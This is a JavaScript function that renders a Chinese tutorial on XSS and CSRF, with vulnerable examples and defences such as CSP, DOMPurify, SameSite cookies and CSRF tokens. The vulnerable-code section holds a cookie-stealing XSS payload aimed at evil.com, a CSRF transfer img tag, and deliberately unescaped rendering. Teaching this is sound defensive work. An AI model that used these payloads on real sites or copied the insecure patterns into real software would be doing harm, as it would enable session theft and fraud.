function renderXssCsrf(t) {
  const question = ruleBox('info',
    `<strong>结论：</strong>
    <strong>XSS（跨站脚本）</strong>：攻击者向页面注入恶意脚本，在受害者浏览器执行，窃取 Cookie/Token 或劫持操作。防御核心：<strong>输出转义 + CSP</strong>。
    <strong>CSRF（跨站请求伪造）</strong>：攻击者诱导用户访问恶意页面，该页面自动以用户身份发起请求。防御核心：<strong>CSRF Token + SameSite Cookie</strong>。`);

  const principle = `
    <p><strong>XSS 三种类型：</strong></p>
    <ul>
      <li><strong>存储型（Stored XSS）</strong>：恶意脚本存入数据库，其他用户访问时执行。危害最大，如评论区注入 <code>&lt;script&gt;</code>。</li>
      <li><strong>反射型（Reflected XSS）</strong>：恶意脚本在 URL 参数中，服务端直接将参数拼入 HTML 响应，点击构造的链接触发。</li>
      <li><strong>DOM 型（DOM-based XSS）</strong>：前端 JS 将 URL 参数/用户输入直接写入 DOM（<code>innerHTML</code>/<code>document.write</code>），无需经过服务端。</li>
    </ul>
    <p><strong>CSRF 攻击原理：</strong>浏览器发请求时自动携带目标域的 Cookie。攻击者在自己的页面放一个 <code>&lt;img src="https://bank.com/transfer?to=hacker&amount=1000"&gt;</code>，用户只要访问该页面且已登录 bank.com，转账请求就会以用户身份自动发出。</p>`;

  const xssBadCode = `// ✗ XSS 漏洞示例

// 1. 直接将用户输入写入 innerHTML（DOM 型 XSS）
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = '你好，' + name;
// 攻击：?name=<img onerror="document.location='//evil.com/steal?c='+document.cookie" src=x>

// 2. 服务端模板未转义（存储型/反射型 XSS）
// Express + EJS
app.get('/user', (req, res) => {
  res.render('user', { bio: req.query.bio }); // ← 未转义
  // 模板：<p><%- bio %></p>   ← <%- 不转义！应用 <%= %>
});

// 3. React 的 dangerouslySetInnerHTML 使用不当
const html = '<script>evil()<\/script>';
return <div dangerouslySetInnerHTML={{ __html: html }} />; // ← 信任了用户输入`;

  const xssCsrfGoodCode = `// ✓ XSS 防御

// 1. 前端：永远不用 innerHTML 渲染用户内容，用 textContent 或框架的模板
document.getElementById('greeting').textContent = '你好，' + name; // 自动转义

// 2. 如果必须渲染富文本，用白名单净化库
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'a', 'ul', 'li'],
  ALLOWED_ATTR: ['href'],
});
container.innerHTML = clean;

// 3. 设置 CSP（内容安全策略）—— 最强防线
// HTTP 响应头（或 <meta http-equiv="Content-Security-Policy">）:
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{随机值}'; object-src 'none'
// nonce 机制：只有带正确 nonce 的 <script> 才执行，内联脚本和注入脚本均被阻止

// ✓ CSRF 防御

// 方案一：SameSite Cookie（现代推荐，无需改代码）
res.cookie('sessionId', id, { sameSite: 'strict', httpOnly: true, secure: true });
// strict 模式下跨站 POST 不携带 Cookie，CSRF 直接无效

// 方案二：CSRF Token（兼容旧浏览器）
// 服务端生成 token 存入 session，页面渲染时放入表单隐藏字段
// <input type="hidden" name="_csrf" value="{{ csrfToken }}">

// Express + csurf 中间件
import csrf from 'csurf';
app.use(csrf({ cookie: true }));
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// 方案三：检查 Origin/Referer 头
// 服务端验证请求的 Origin 是否在白名单内（CORS 同理）
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer || '';
  if (['POST','PUT','DELETE'].includes(req.method) && !origin.startsWith('https://app.com')) {
    return res.status(403).json({ error: 'CSRF detected' });
  }
  next();
});`;

  const notes = [
    ruleBox('warning', `<strong>CSP 最难的部分：内联脚本。</strong>禁止 <code>'unsafe-inline'</code> 后，所有内联 <code>&lt;script&gt;</code> 和 <code>onclick=""</code> 都会失效。解决方案：① 使用 <code>nonce</code>（每次请求随机值，服务端注入到合法脚本标签）；② 使用 <code>strict-dynamic</code>（信任的脚本可动态加载其他脚本，适合 SPA 场景）。`),
    ruleBox('info', `<strong>XSS 与框架：</strong>React/Vue 默认对插值进行 HTML 转义（<code>{userInput}</code> 安全），但 <code>dangerouslySetInnerHTML</code> / <code>v-html</code> 会绕过转义。富文本编辑器、Markdown 渲染必须使用 DOMPurify 等净化库，或配置 CSP 作为第二道防线。`),
    ruleBox('success', `<strong>安全检查清单：</strong>① 所有用户输入输出时转义；② Cookie 设 HttpOnly + Secure + SameSite；③ 部署严格的 CSP；④ 敏感操作（转账、改密码）要求二次验证；⑤ 使用 <code>helmet</code>（Node.js）自动设置安全相关 HTTP 头（X-Frame-Options、X-Content-Type-Options 等）。`),
  ];

  return articleShell(t, `
    ${section('核心问题', question)}
    ${section('原理剖析', principle)}
    ${section('代码示例', codeBlock('✗ XSS 漏洞示例', 'dot-red', 'javascript', xssBadCode) + codeBlock('✓ XSS + CSRF 完整防御方案', 'dot-green', 'javascript', xssCsrfGoodCode))}
    ${section('延伸与注意事项', notes.join(''))}`);
}
